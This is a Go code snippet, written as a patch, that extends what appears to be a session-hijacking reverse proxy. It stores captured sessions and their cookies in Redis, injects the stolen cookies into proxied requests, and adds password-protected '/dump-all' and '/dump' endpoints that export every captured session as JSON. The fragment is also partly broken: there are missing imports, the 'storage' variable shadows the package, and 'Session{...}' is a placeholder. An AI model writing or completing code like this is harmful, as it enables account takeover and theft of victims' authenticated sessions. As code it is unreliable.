// ... (Keep existing imports, add:)
import (
	"./storage"
	"encoding/base64"
	"net/http"
)

// In main(), after router:
storage, err := storage.NewStorage(os.Getenv("REDIS_URL"))
if err != nil {
	log.Fatalf("Storage init failed: %v", err)
}
defer storage.Close()

// Use storage in handlers (e.g., in captureHandler):
sess := Session{...}
if err := storage.SetSession(sess); err != nil {
	log.Printf("Set session failed: %v", err)
}

// In proxyHandler director:
if sid := getSessionID(req); sid != "" {
	sess, err := storage.GetSession(sid)
	if err == nil {
		for k, v := range sess.Cookies {
			req.Header[k] = v
		}
	}
}

// Add dump endpoint (after r = mux.NewRouter())
r.HandleFunc("/dump-all", func(w http.ResponseWriter, r *http.Request) {
	if !basicAuth(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	sessions, err := storage.DumpAllSessions()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(sessions)
}).Methods("GET")

r.HandleFunc("/dump", func(w http.ResponseWriter, r *http.Request) {
	if !basicAuth(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	id := r.URL.Query().Get("sid")
	if id == "" {
		http.Error(w, "SID required", http.StatusBadRequest)
		return
	}
	sess, err := storage.DumpSession(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}
	json.NewEncoder(w).Encode(sess)
}).Methods("GET")

// Basic auth helper
func basicAuth(r *http.Request) bool {
	user, pass, ok := r.BasicAuth()
	return ok && user == "admin" && pass == os.Getenv("DUMP_PASS")  // Env: DUMP_PASS=pass
}
